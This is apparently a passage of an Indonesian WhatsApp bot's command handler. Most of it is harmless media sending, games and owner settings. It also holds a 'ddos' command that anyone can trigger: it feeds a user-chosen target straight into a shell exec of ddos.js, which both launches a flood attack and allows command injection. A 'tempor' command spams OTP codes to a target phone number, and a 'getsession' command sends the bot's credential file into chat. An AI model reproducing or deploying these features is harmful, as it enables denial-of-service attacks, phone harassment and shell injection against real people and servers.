for (let BhosdikaXeon of VoiceNoteXeon) {
    if (input === BhosdikaXeon.toLowerCase().trim()) {
        let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
        XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
        break
    }
}

// ====== Cache Path & Load ======
const sentStickersPath = './sentStickers.json'
const sentImagesPath = './sentImages.json'
const sentDocsPath = './sentDocs.json'

let sentStickers = {}, sentImages = {}, sentDocs = {}

if (fs.existsSync(sentStickersPath)) {
    try { sentStickers = JSON.parse(fs.readFileSync(sentStickersPath)) } catch (e) {}
}
if (fs.existsSync(sentImagesPath)) {
    try { sentImages = JSON.parse(fs.readFileSync(sentImagesPath)) } catch (e) {}
}
if (fs.existsSync(sentDocsPath)) {
    try { sentDocs = JSON.parse(fs.readFileSync(sentDocsPath)) } catch (e) {}
}

function saveSentStickers() {
    fs.writeFileSync(sentStickersPath, JSON.stringify(sentStickers, null, 2))
}
function saveSentImages() {
    fs.writeFileSync(sentImagesPath, JSON.stringify(sentImages, null, 2))
}
function saveSentDocs() {
    fs.writeFileSync(sentDocsPath, JSON.stringify(sentDocs, null, 2))
}

// ====== Group Check Function ======
const groupTarget = '120363381650629890@g.us'
async function checkUserInGroup(sender) {
    try {
        const metadata = await XeonBotInc.groupMetadata(groupTarget)
        const participants = metadata.participants.map(p => p.id)
        const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
        return participants.includes(senderJid)
    } catch (err) {
        console.log('Gagal cek grup:', err.message)
        return false
    }
}

// ====== STICKER ======
for (let BhosdikaXeon of StickerXeon) {
    if (input === BhosdikaXeon.toLowerCase().trim()) {
        if (!(await checkUserInGroup(m.sender))) {
            await XeonBotInc.sendMessage(m.chat, {
                text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
            }, { quoted: m })
            break
        }

        try {
            if (sentStickers[BhosdikaXeon]) {
                const { remoteJid, id, message } = sentStickers[BhosdikaXeon]
                await XeonBotInc.sendMessage(m.chat, {
                    forward: { key: { remoteJid, id }, message }
                }, { quoted: m })
            } else {
                let buff = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
                const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buff }, { quoted: m })
                sentStickers[BhosdikaXeon] = {
                    remoteJid: m.chat,
                    id: sentMsg.key.id,
                    message: sentMsg.message
                }
                saveSentStickers()
            }
        } catch (err) {
            console.log('Gagal kirim sticker:', err)
        }
        break
    }
}

// ====== IMAGE ======
for (let BhosdikaXeon of ImageXeon) {
    if (input === BhosdikaXeon.toLowerCase().trim()) {
        try {
            if (sentImages[BhosdikaXeon]) {
                const { remoteJid, id, message } = sentImages[BhosdikaXeon]
                await XeonBotInc.sendMessage(m.chat, {
                    forward: { key: { remoteJid, id }, message }
                }, { quoted: m })
            } else {
                let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
                const sentMsg = await XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
                sentImages[BhosdikaXeon] = {
                    remoteJid: m.chat,
                    id: sentMsg.key.id,
                    message: sentMsg.message
                }
                saveSentImages()
            }
        } catch (err) {
            console.log('Gagal kirim image:', err)
        }
        break
    }
}

// ====== VIDEO ======
for (let BhosdikaXeon of VideoXeon) {
    if (input === BhosdikaXeon.toLowerCase().trim()) {
        try {
            let videoBuff = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
            await XeonBotInc.sendMessage(m.chat, { video: videoBuff }, { quoted: m })
        } catch (err) {
            console.log('Gagal kirim video:', err)
        }
        break
    }
}

// ====== APK ======
for (let BhosdikaXeon of ApkXeon) {
    if (input === BhosdikaXeon.toLowerCase().trim()) {
        try {
            let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
            await XeonBotInc.sendMessage(m.chat, {
                document: buffer,
                mimetype: 'application/vnd.android.package-archive'
            }, { quoted: m })
        } catch (err) {
            console.log('Gagal kirim APK:', err)
        }
        break
    }
}

// ====== ZIP ======
for (let BhosdikaXeon of ZipXeon) {
    if (input === BhosdikaXeon.toLowerCase().trim()) {
        try {
            let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
            await XeonBotInc.sendMessage(m.chat, {
                document: buffer,
                mimetype: 'application/zip'
            }, { quoted: m })
        } catch (err) {
            console.log('Gagal kirim ZIP:', err)
        }
        break
    }
}

// ====== PDF ======
for (let BhosdikaXeon of DocXeon) {
    if (input === BhosdikaXeon.toLowerCase().trim()) {
        try {
            if (sentDocs[BhosdikaXeon]) {
                const { remoteJid, id, message } = sentDocs[BhosdikaXeon]
                await XeonBotInc.sendMessage(m.chat, {
                    forward: { key: { remoteJid, id }, message }
                }, { quoted: m })
            } else {
                let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
                const sentMsg = await XeonBotInc.sendMessage(m.chat, {
                    document: buffer,
                    mimetype: 'application/pdf'
                }, { quoted: m })
                sentDocs[BhosdikaXeon] = {
                    remoteJid: m.chat,
                    id: sentMsg.key.id,
                    message: sentMsg.message
                }
                saveSentDocs()
            }
        } catch (err) {
            console.log('Gagal kirim PDF:', err)
        }
        break
    }
}

// Respon Cmd with media (aman 100%)
if (isMedia && m.msg.fileSha256) {
    const fileHash = m.msg.fileSha256.toString('base64');
    if (fileHash in global.db.data.sticker) {
        const hash = global.db.data.sticker[fileHash];
        const { text, mentionedJid } = hash;

        // Kirim balasan langsung, tanpa emit ulang event
        await XeonBotInc.sendMessage(m.chat, {
            text: text,
            mentions: mentionedJid || []
        }, {
            quoted: m
        });
    }
}
//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygcxeon(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else replygcxeon('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // replygcxeon(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygcxeon({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) XeonBotInc.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            XeonBotInc.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        
// Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
    let win = ''
    let seri = false

    if (m.sender == roof.p2 && /^(terima|iya|ya|tolak|tidak)$/i.test(m.text) && m.isGroup && roof.status == 'wait') {
        if (/^(tolak|tidak)$/i.test(m.text)) {
            XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak tantangan suit, permainan dibatalkan.`, m)
            delete this.suit[roof.id]
            return !0
        }

        roof.status = 'play'
        roof.asal = m.chat
        clearTimeout(roof.waktu)

        XeonBotInc.sendText(m.chat, `Permainan suit telah dikirim ke chat pribadi:

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silakan pilih di chat pribadi masing-masing:
Klik: https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })

        if (!roof.pilih) XeonBotInc.sendText(roof.p, `Silakan pilih:\n\nBatu\u{1FAA8}\nKertas\u{1F4C4}\nGunting\u{2702}\u{FE0F}`, m)
        if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Silakan pilih:\n\nBatu\u{1FAA8}\nKertas\u{1F4C4}\nGunting\u{2702}\u{FE0F}`, m)

        roof.waktu_milih = setTimeout(() => {
            if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `\u23F1 Kedua pemain tidak memilih, permainan dibatalkan.`)
            else if (!roof.pilih || !roof.pilih2) {
                win = !roof.pilih ? roof.p2 : roof.p
                XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih, permainan berakhir.`, m)
            }
            delete this.suit[roof.id]
            return !0
        }, roof.timeout)
    }

    let jwb = m.sender == roof.p
    let jwb2 = m.sender == roof.p2
    let gunting = /gunting/i
    let batu = /batu/i
    let kertas = /kertas/i
    let reg = /^(gunting|batu|kertas)/i

    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
        roof.pilih = reg.exec(m.text.toLowerCase())[0]
        roof.text = m.text
        replygcxeon(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n\u231B Menunggu lawan memilih...` : ''}`)
        if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu')
    }

    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
        roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
        roof.text2 = m.text
        replygcxeon(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n\u231B Menunggu lawan memilih...` : ''}`)
        if (!roof.pilih) XeonBotInc.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu')
    }

    let pilihan1 = roof.pilih
    let pilihan2 = roof.pilih2

    if (pilihan1 && pilihan2) {
        clearTimeout(roof.waktu_milih)

        if (batu.test(pilihan1) && gunting.test(pilihan2)) win = roof.p
        else if (batu.test(pilihan1) && kertas.test(pilihan2)) win = roof.p2
        else if (gunting.test(pilihan1) && kertas.test(pilihan2)) win = roof.p
        else if (gunting.test(pilihan1) && batu.test(pilihan2)) win = roof.p2
        else if (kertas.test(pilihan1) && batu.test(pilihan2)) win = roof.p
        else if (kertas.test(pilihan1) && gunting.test(pilihan2)) win = roof.p2
        else if (pilihan1 == pilihan2) seri = true

        XeonBotInc.sendText(roof.asal, `\u{1F3AE} *Hasil Suit* ${seri ? '\n\u2696 SERI!' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${seri ? '' : roof.p == win ? `\u{1F3C6} Menang\n` : `\u274C Kalah\n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${seri ? '' : roof.p2 == win ? `\u{1F3C6} Menang\n` : `\u274C Kalah\n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })

        delete this.suit[roof.id]
    }
} //end
        
        //user db
        if (isCommand && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, null, 2))
}
        
        switch (isCommand) {
            case 'addbadword': case 'addbd':
               if (!XeonTheCreator) return XeonStickOwner()
               if (!groupAdmins) return replygcxeon(mess.admin)
               if (args.length < 1) return replygcxeon( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcxeon('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!XeonTheCreator) return XeonStickOwner()
               if (!groupAdmins) return replygcxeon(mess.admin)
               if (args.length < 1) return replygcxeon( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcxeon('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!XeonTheCreator) return XeonStickOwner()
               let totalusernya = db.data.users[0]
               replygcxeon(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!XeonTheCreator) return XeonStickOwner()
               global.db.data.settings[botNumber].totalhit = 0
               replygcxeon(mess.done)
            }
            break
            case 'setmenu':{
               if (!XeonTheCreator) return XeonStickOwner()
               if (!text) return replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
               if (text.startsWith('v')) {
                  typemenu = text
                  replygcxeon(mess.done)
               } else {
                  replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
               }
            }
            break
            case 'setreply':{
               if (!XeonTheCreator) return XeonStickOwner()
               if (!text) return replygcxeon(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
               if (text.startsWith('v')) {
                  typereply = text
                  replygcxeon(mess.done)
               } else {
                  replygcxeon(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
               }
            }
            break
            case 'statustext': 
            case 'upswteks': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (!q) return replygcxeon('Text?')
               await XeonBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               replygcxeon(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await replygcxeon(mess.done)
               } else {
       replygcxeon('Reply to video')
               }
            }
            break
            case 'ddos': case 'mix':{
                if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
             replygcxeon(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         }
                break
                
                //HiraaZxD

case 'tempor': {
if (!XeonTheCreator) return XeonStickOwner()
  if (!q.includes('|')) return replygcxeon(`Use: .tempor <kode negara>|<nomor kartu>\nExaple: .${command} +62|83754338986`)
    const kodenegara = q.substring(0, q.indexOf('|') - 0)
    const nomortarget = q.substring(q.lastIndexOf('|') + 1) 
m.reply(`*Temporary Sukses*\nBot sedang Spam Otp Silahkan Cek Nomor Target\nKetik ${prefix}stoptempor untuk Menghentikan Temporary`);
await temporary(XeonBotInc, m, kodenegara, nomortarget, from)
}
break
                break
                
            case 'restart': case 'restartbot': case 'stoptempor':{
                m.reply(`Sedang ${command} Mohon tunggu`)
                await sleep(2300)
                process.exit(1);
                m.reply(`sukses ${command}`)
            }
        case 'jadibot': {
            if (!text) return replygcxeon('*<!> Example:* .jadibot 628xxx')
if (!XeonTheCreator) return replygcxeon('Khusus Owner')
if (m.isGroup) return replygcxeon("Maaf Kak Fitur Ini Hanya Bisa Di Gunakan Di Pribadi Chat")      
await jadibot(XeonBotInc, text, fkontak, from)
            let loli = '`'
     await sleep(4500)      
        replygcxeon(`*Masukkan code dibawah ini untuk jadi bot sementara*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code di bawah ini\n\nNote: code dapat expired kapan saja!\n\nCode: ${loli}${global.codepairing}${loli}\nJika Code Error Silahkan Hapus  Folder Jadibot`);
      
}
break     
case 'stopjadibot':
if (!XeonTheCreator) return XeonStickOwner()
replygcxeon("apus manual bg bot kurang canggih :v")
break
            case 'listjadibot': 
           if (!XeonTheCreator) return XeonStickOwner() 
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await XeonBotInc.decodeJid(i.id)
te += " • User : @" + y.split("@")[0] + "\n"
te += " • Name : " + i.name + "\n\n"
}
XeonBotInc.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcxeon(`Belum Ada User Yang Jadibot`)
}
break            
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await replygcxeon(mess.done)
               } else {
                  replygcxeon('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await replygcxeon(mess.done)
               } else {
                  replygcxeon('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!XeonTheCreator) return XeonStickOwner()
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './XeonMedia/theme/cheemspic.jpg')
                fs.unlinkSync(delb)
                replygcxeon(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!XeonTheCreator) return XeonStickOwner()
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './XeonMedia/theme/Cheems-bot.mp4')
                fs.unlinkSync(delb)
                replygcxeon(mess.done)
            }
            break
            case 'addtitle':{
               if (!XeonTheCreator) return XeonStickOwner()
               if (!text) return replygcxeon(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await replygcxeon(mess.done)
            }
            break
            case 'deltitle':{
               if (!XeonTheCreator) return XeonStickOwner()
               if (!text) return replygcxeon(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await replygcxeon(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                replygcxeon(mess.done)
            }
            break
            case 'dellimit':{
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcxeon(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                replygcxeon(mess.done)
            }
            break
            case 'addprem':
    if (!XeonTheCreator) return XeonStickOwner()
    if (args.length < 2)
        return replygcxeon(`Usage: ${prefix + command} @tag time\n${prefix + command} number time\n\nExample: ${prefix + command} @tag 30d`)

    if (m.mentionedJid.length !== 0) {
        m.mentionedJid.forEach(jid => {
            addPremiumUser(jid, args[1], premium)
        })
    } else {
        const number = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
        addPremiumUser(number, args[1], premium)
    }
    replygcxeon("Premium Success")
    break

case 'delprem': {
    if (!XeonTheCreator) return XeonStickOwner();
    
    if (args.length < 1)
        return replygcxeon(`Usage: ${prefix + command} @tag\n${prefix + command} nomor\n\nContoh: ${prefix + command} 6281234567890`);

    let deleted = 0;

    if (m.mentionedJid.length !== 0) {
        m.mentionedJid.forEach(jid => {
            const pos = getPremiumPosition(jid, premium);
            if (pos !== null && pos !== -1) {
                premium.splice(pos, 1);
                deleted++;
            }
        });
    } else {
        const number = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const pos = getPremiumPosition(number, premium);
        if (pos !== null && pos !== -1) {
            premium.splice(pos, 1);
            deleted++;
        }
    }

    fs.writeFileSync(premiumPath, JSON.stringify(premium, null, 2));

    if (deleted === 0) {
        replygcxeon("User tersebut tidak terdaftar sebagai premium.");
    } else {
        replygcxeon(`Sukses menghapus ${deleted} user dari daftar premium.`);
    }
}
break;




case 'listprem': {
    if (!XeonTheCreator) return XeonStickOwner();

    const data = JSON.parse(fs.readFileSync(premiumPath, 'utf-8'));

    if (data.length === 0) return replygcxeon("Belum ada pengguna premium yang terdaftar.");

    // Menggunakan format yang sama dengan animemenu
    let premiumText = `${global.premiumListMenu(data)}`;

    XeonBotInc.sendMessage(m.chat, {
        text: premiumText
    }, {
        quoted: m
    });
}
break;
case 'addowner':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcxeon(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!XeonTheCreator) return XeonStickOwner()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcxeon('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcxeon(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcxeon(teks)
                    await sleep(2000)
                    replygcxeon("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcxeon("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!XeonTheCreator) return XeonStickOwner()
                    if (!text) return replygcxeon('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    XeonBotInc.groupAcceptInvite(result)
                    await replygcxeon(`Done`)
                } catch {
                    replygcxeon('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!XeonTheCreator) return XeonStickOwner()
                replygcxeon('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                XeonBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!XeonTheCreator) return XeonStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcxeon("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return replygcxeon(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                XeonBotInc.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            XeonBotInc.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'shutdown':
                if (!XeonTheCreator) return XeonStickOwner()
                replygcxeon(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    replygcxeon(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    replygcxeon(`Successfully changed autoread to ${q}`)
                }
            break
            case 'unavailable':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    replygcxeon(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    replygcxeon(`Successfully changed unavailable to ${q}`)
                }
            break
            case 'autorecordtype':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    replygcxeon(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    replygcxeon(`Successfully changed Auto-RecordingTyping to ${q}`)
                }
            break
            case 'autorecord':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    replygcxeon(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    replygcxeon(`Successfully changed Auto-Recording to ${q}`)
                }
            break
            case 'autotype':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    replygcxeon(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    replygcxeon(`Successfully changed Auto-Typing to ${q}`)
                }
            break
            case 'autobio':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autosticker': case 'autostickergc':
                if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
